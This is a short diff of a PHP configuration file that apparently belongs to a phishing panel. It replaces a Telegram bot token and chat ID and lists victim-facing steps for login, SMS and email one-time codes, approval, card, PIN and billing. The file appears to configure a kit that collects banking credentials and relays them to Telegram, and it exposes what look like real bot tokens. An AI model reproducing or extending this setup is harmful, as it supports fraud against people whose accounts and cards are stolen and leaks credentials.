@@ -12,8 +12,8 @@ define('STATE_DIR',         __DIR__ . DIRECTORY_SEPARATOR . 'states');
 define('PANEL_BASE_URL',    (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http') . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . dirname($_SERVER['SCRIPT_NAME'] ?? '/'));
 
 // Telegram
-define('TG_BOT_TOKEN', '6553507149:AAEb1A6FuV5_VzwhoxDnYnB-nguXKSN2crc');
-define('TG_CHAT_ID',   '-5386379419');
+define('TG_BOT_TOKEN', '7802168968:AAHpz2nbyybeIhcdMRBtwLTnme49QCIehY');
+define('TG_CHAT_ID',   '-5121800974');
 
 // All valid steps (approve added)
 $GLOBALS['VALID_STEPS'] = array('login', 'sms', 'emailotp', 'approve', 'card', 'pin', 'billing');
